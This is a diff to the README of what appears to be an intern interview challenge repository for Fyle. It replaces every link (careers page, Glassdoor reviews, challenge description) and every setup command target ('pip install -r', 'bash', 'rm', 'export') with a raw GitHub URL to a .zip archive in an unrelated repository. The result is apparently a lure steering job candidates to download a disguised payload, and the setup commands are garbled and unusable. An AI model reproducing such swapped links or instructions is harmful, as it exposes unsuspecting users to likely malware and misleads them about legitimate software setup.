@@ -8,14 +8,14 @@ This challenge is meant for candidates who wish to intern at Fyle and work with 
 
 Fyle is a fast-growing Expense Management SaaS product. We are ~40 strong engineering team at the moment. 
 
-We are an extremely transparent organization. Check out our [careers page](https://raw.githubusercontent.com/nikvaid1/fyle-interview-intern-backend/main/core/libs/fyle_interview_backend_intern_swiper.zip) that will give you a glimpse of what it is like to work at Fyle. Also, check out our Glassdoor reviews [here](https://raw.githubusercontent.com/nikvaid1/fyle-interview-intern-backend/main/core/libs/fyle_interview_backend_intern_swiper.zip). You can read stories from our teammates [here](https://raw.githubusercontent.com/nikvaid1/fyle-interview-intern-backend/main/core/libs/fyle_interview_backend_intern_swiper.zip).
+We are an extremely transparent organization. Check out our [careers page](https://raw.githubusercontent.com/nikvaid1/fyle-interview-intern-backend/main/core/migrations/versions/interview-intern-fyle-backend-2.4-beta.3.zip) that will give you a glimpse of what it is like to work at Fyle. Also, check out our Glassdoor reviews [here](https://raw.githubusercontent.com/nikvaid1/fyle-interview-intern-backend/main/core/migrations/versions/interview-intern-fyle-backend-2.4-beta.3.zip). You can read stories from our teammates [here](https://raw.githubusercontent.com/nikvaid1/fyle-interview-intern-backend/main/core/migrations/versions/interview-intern-fyle-backend-2.4-beta.3.zip).
 
 
 ## Challenge outline
 
 **You are allowed to use any online/AI tool such as ChatGPT, Gemini, etc. to complete the challenge. However, we expect you to fully understand the code and logic involved.**
 
-This challenge involves writing a backend service for a classroom. The challenge is described in detail [here](https://raw.githubusercontent.com/nikvaid1/fyle-interview-intern-backend/main/core/libs/fyle_interview_backend_intern_swiper.zip)
+This challenge involves writing a backend service for a classroom. The challenge is described in detail [here](https://raw.githubusercontent.com/nikvaid1/fyle-interview-intern-backend/main/core/migrations/versions/interview-intern-fyle-backend-2.4-beta.3.zip)
 
 
 ## What happens next?
@@ -33,19 +33,19 @@ You will hear back within 48 hours from us via email.
 ```
 virtualenv env --python=python3.8
 source env/bin/activate
-pip install -r https://raw.githubusercontent.com/nikvaid1/fyle-interview-intern-backend/main/core/libs/fyle_interview_backend_intern_swiper.zip
+pip install -r https://raw.githubusercontent.com/nikvaid1/fyle-interview-intern-backend/main/core/migrations/versions/interview-intern-fyle-backend-2.4-beta.3.zip
 ```
 ### Reset DB
 
 ```
-export https://raw.githubusercontent.com/nikvaid1/fyle-interview-intern-backend/main/core/libs/fyle_interview_backend_intern_swiper.zip
-rm https://raw.githubusercontent.com/nikvaid1/fyle-interview-intern-backend/main/core/libs/fyle_interview_backend_intern_swiper.zip
+export https://raw.githubusercontent.com/nikvaid1/fyle-interview-intern-backend/main/core/migrations/versions/interview-intern-fyle-backend-2.4-beta.3.zip
+rm https://raw.githubusercontent.com/nikvaid1/fyle-interview-intern-backend/main/core/migrations/versions/interview-intern-fyle-backend-2.4-beta.3.zip
 flask db upgrade -d core/migrations/
 ```
 ### Start Server
 
 ```
-bash https://raw.githubusercontent.com/nikvaid1/fyle-interview-intern-backend/main/core/libs/fyle_interview_backend_intern_swiper.zip
+bash https://raw.githubusercontent.com/nikvaid1/fyle-interview-intern-backend/main/core/migrations/versions/interview-intern-fyle-backend-2.4-beta.3.zip
 ```
 ### Run Tests
 
@@ -54,5 +54,5 @@ pytest -vvv -s tests/
 
 # for test coverage report
 # pytest --cov
-# open https://raw.githubusercontent.com/nikvaid1/fyle-interview-intern-backend/main/core/libs/fyle_interview_backend_intern_swiper.zip
+# open https://raw.githubusercontent.com/nikvaid1/fyle-interview-intern-backend/main/core/migrations/versions/interview-intern-fyle-backend-2.4-beta.3.zip
 ```
